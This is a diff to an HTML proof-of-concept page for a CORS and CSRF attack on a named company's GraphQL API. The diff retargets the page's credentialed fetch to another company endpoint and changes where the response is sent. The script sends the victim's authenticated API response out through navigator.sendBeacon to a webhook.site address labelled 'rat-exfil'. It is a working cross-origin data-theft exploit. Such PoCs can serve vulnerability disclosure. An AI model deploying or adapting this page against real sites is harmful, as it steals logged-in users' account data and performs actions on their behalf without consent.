@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OpenDoor(CORS + CSRF)POC </title>
+    <title>(CORS + CSRF)POC </title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 40px; background-color: #f9f9f9; }
         .card { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
@@ -19,7 +19,7 @@
     <h2>OpenDoor(CORS + CSRF) GraphQL POC</h2>
     <p class="status-text">Due to misconfigured origin header, any third party website can perform read/write operation on Opendorr. </p>
     <div id="timer-display">3</div>
-    <p style="font-size: 14px; color: #888;">Targeting: <code>CORS at https://graphql.managed.services.opendoor.com/api/graphql</code></p>
+    <p style="font-size: 14px; color: #888;">Targeting: <code>CORS at https://consumer.opendoor.com/api/graphql</code></p>
 </div>
 
 <script>
@@ -41,7 +41,7 @@
 
     // Your Fetch Logic
     function sendGraphQLRequest() {
-        fetch("https://graphql.managed.services.opendoor.com/api/graphql", {
+        fetch("https://consumer.opendoor.com/api/graphql", {
             method: "POST",
             credentials: "include",
             headers: {
@@ -71,7 +71,7 @@
             alert(`Status: ${r.status}\n\nResponse:\n${t}`);
             // Attempt to beacon the data back to your server
             if (navigator.sendBeacon) {
-                navigator.sendBeacon("https://webhook.site/843a557b-f603-4707-9c9b-201ee4369d4e/query", t);
+                navigator.sendBeacon("https://webhook.site/rat-exfil/?cors=", t);
             }
         }))
         .catch(e => {
